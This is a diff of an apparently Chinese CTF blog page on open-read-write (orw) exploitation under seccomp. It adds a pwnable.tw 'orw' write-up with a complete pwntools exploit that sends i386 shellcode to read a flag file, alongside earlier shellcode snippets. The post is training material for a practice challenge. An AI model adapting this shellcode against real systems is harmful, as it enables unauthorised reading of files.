@@ -387,7 +387,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    761
+                    883
                 </div>
                 
 
@@ -417,6 +417,16 @@
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open('/home/orw/flag',0) </span><br><span class="line">s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''</span><br></pre></td></tr></tbody></table></figure>
 
 <h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>开启NX保护的题目，无法执行shellcode，需要通过ROP来调用orw的三个函数</p>
+<h3 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw orw"></a>pwnable.tw orw</h3><p>先checksec一下</p>
+<p><img src="/2024/02/21/orw/pwnable.tw.orw.1.png"></p>
+<p>看一下函数逻辑</p>
+<p><img src="/2024/02/21/orw/pwnable.tw.orw.2.png"></p>
+<p><img src="/2024/02/21/orw/pwnable.tw.orw.3.png"></p>
+<p>先是orw_seccomp限定了orw，然后hint用shellcode过去</p>
+<p>那么写exp:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os="linux", arch="i386", log_level="debug")</span><br><span class="line"></span><br><span class="line">bss = 0x0804A040</span><br><span class="line"></span><br><span class="line">#p = process('./orw')</span><br><span class="line">p = remote('chall.pwnable.tw',10001)</span><br><span class="line">p.recvuntil('shellcode:')</span><br><span class="line"></span><br><span class="line">#open</span><br><span class="line">shellcode = asm("xor ebx,ebx;xor ecx,ecx;xor edx,edx;xor eax,eax;push ebx ;push 0x67616c66 ;push 0x2f77726f ;push 0x2f656d6f ;push 0x682f2f2f ;mov ebx,esp;mov al,0x5;int 0x80;")</span><br><span class="line"></span><br><span class="line">#read</span><br><span class="line">shellcode += asm("mov ebx,0x3;mov ecx,esp ;mov edx,0x40;xor eax,eax;mov al,0x3;int 0x80;")</span><br><span class="line"></span><br><span class="line">#write</span><br><span class="line">shellcode += asm("mov ebx,0x1;xor eax,eax ;mov al,0x4;int 0x80;")</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2024/02/21/orw/pwnable.tw.orw.4.png"></p>
 <h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
 <p><img src="/2024/02/21/orw/SROP%E4%BF%A1%E5%8F%B7.png"></p>
 <p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p>
